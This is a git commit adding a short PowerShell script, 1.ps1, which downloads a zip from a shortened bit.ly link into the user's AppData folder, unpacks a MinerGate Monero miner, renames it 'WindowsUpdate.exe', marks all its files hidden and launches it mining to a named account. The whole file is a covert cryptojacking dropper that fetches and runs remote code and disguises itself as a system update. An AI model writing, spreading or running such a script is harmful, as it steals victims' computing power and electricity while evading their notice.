ee86fb0f7646a34924a54ee2ea53e9233fe93e11
m0ner0 <52392255+m0ner0@users.noreply.github.com>
2019-07-01 02:57:52 +0000

    Add files via upload

---
+++ 1.ps1
@@ -0,0 +1,21 @@
+﻿$url = "https://bit.ly/31vjJMZ"
+
+$output = "C:\Users\$env:UserName\AppData\Local\1\1.zip"
+
+New-Item -ItemType directory -Path C:\Users\$env:UserName\AppData\Local\1
+
+Invoke-WebRequest -Uri $url -OutFile $output
+
+expand-archive -path $output -destinationpath C:\Users\$env:UserName\AppData\Local\1\unzipped
+
+Rename-Item -Path "C:\Users\$env:UserName\AppData\Local\1\unzipped\minergate-cli.exe" -NewName "WindowsUpdate.exe"
+
+
+Get-ChildItem -path "C:\Users\$env:UserName\AppData\Local\1" -Recurse -Force | foreach {$_.attributes = "hidden"}
+
+
+
+& C:\Users\$env:UserName\AppData\Local\1\unzipped\WindowsUpdate.exe --user m0ner0@hotmail.com --xmr 2
+
+
+
